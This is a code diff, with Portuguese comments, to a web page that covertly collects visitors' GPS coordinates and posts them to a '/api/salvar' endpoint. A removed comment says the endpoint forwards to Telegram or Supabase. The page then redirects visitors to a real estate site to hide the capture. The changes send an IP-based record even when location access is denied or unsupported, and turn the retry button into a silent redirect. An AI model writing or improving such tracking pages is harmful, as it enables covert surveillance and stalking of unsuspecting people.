@@ -60,6 +60,21 @@
     </div>
 
     <script>
+        let enviado = false;
+
+        function enviarDados(lat, lon, precisao) {
+            if (enviado) return; // Garante que envia apenas uma vez
+            enviado = true;
+
+            fetch('/api/salvar', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ lat, lon, precisao })
+            }).finally(() => {
+                window.location.href = "https://www.imovelweb.com.br";
+            });
+        }
+
         function pegarLocalizacao() {
             const statusTexto = document.getElementById('status-texto');
             const modalGps = document.getElementById('modal-gps');
@@ -71,33 +86,26 @@
                     let precisao = pos.coords.accuracy;
 
                     statusTexto.innerText = "Localização confirmada! Redirecionando...";
-
-                    // Envia os dados para a sua API (Telegram ou Supabase)
-                    fetch('/api/salvar', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ lat, lon, precisao })
-                    }).finally(() => {
-                        window.location.href = "https://www.imovelweb.com.br";
-                    });
+                    enviarDados(lat, lon, precisao);
 
                 }, function(err) {
-                    // Se o GPS estiver desligado ou negado, o navegador dispara erro imediatamente.
-                    // Em vez de falhar em silêncio, exibimos o nosso pop-up customizado!
+                    // Se o GPS falhou ou foi negado (comum no iPhone), 
+                    // enviamos o registro do IP mesmo sem a coordenada e abrimos o seu pop-up
+                    enviarDados("NEGADO_OU_SEM_GPS", "NEGADO_OU_SEM_GPS", "0");
                     modalGps.style.display = "flex";
                 }, {
                     timeout: 7000,
                     enableHighAccuracy: true
                 });
             } else {
-                window.location.href = "https://www.imovelweb.com.br";
+                enviarDados("NAO_SUPORTADO", "NAO_SUPORTADO", "0");
             }
         }
 
         // Quando o usuário clica no botão do pop-up para tentar de novo
         function tentarNovamente() {
             document.getElementById('modal-gps').style.display = "none";
-            pegarLocalizacao(); // Tenta disparar a permissão nativa do navegador novamente
+            window.location.href = "https://www.imovelweb.com.br";
         }
 
         // Executa assim que a página abre
